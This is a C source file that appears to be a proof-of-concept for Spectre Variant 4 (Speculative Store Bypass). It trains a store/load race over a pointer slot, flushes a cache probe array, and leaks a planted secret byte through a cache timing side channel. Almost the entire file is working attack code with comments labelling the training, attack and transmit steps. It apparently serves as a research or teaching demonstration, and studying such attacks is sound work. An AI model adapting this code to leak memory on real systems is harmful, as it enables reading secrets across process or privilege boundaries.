#include "utils.c"

// --- Spectre Variant 4 (Speculative Store Bypass) ---
// A store to a pointer slot is followed by a dependent load that can speculatively
// BYPASS the store (store-to-load forwarding not yet resolved), dereferencing the
// STALE pointer value — which the attacker has arranged to point at a secret — and
// transmitting the read byte through the cache probe array. Portable C (no x86 asm);
// a compiler barrier keeps the store from being folded into the load.

uint8_t  v4_public[64];                 // benign data the store redirects to
uint8_t  v4_secret = 'V';               // the byte to leak
uint8_t *v4_slot;                       // pointer the store/load race over

__attribute__((noinline))
void ssb_read(uint8_t **slot, uint8_t *safe)
{
    *slot = safe;                       // STORE: redirect slot to safe data
    __asm__ __volatile__("" ::: "memory");   // portable barrier: keep the store
    uint8_t v = *(*slot);               // LOAD: may bypass the store, use stale ptr
    probe_array[v * CACHE_LINE_SIZE] = 1;    // TRANSMIT via cache side channel
}

int main(void)
{
    common_init();
    printf("--- Spectre v4 (Speculative Store Bypass) ---\n");

    // Train: the load learns to speculate past the store.
    for (int i = 0; i < 1000; i++) {
        v4_slot = &v4_secret;
        ssb_read(&v4_slot, v4_public);
    }
    _mm_mfence();
    flush_probe_array();
    _mm_lfence();

    // Attack: slot still stale-points at the secret when the load speculates.
    v4_slot = &v4_secret;
    ssb_read(&v4_slot, v4_public);

    perform_measurement(v4_secret, "SPECTRE_V4 secret");
    return 0;
}
